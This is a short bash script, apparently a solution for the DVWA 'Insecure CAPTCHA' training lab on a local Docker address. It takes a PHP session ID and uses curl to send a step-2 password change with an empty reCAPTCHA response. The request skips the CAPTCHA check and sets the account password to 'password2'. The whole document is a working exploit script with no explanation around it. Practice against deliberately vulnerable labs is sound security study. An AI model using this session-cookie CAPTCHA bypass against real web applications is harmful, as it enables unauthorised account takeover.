#!/bin/bash

phpsessid=$1
password="password2"

curl -v\
	--cookie "PHPSESSID=$phpsessid; security=low" \
	--data "step=2&password_new=$password&password_conf=$password&g-recaptcha-response=&Change=Change" \
	http://172.17.0.2/vulnerabilities/captcha/

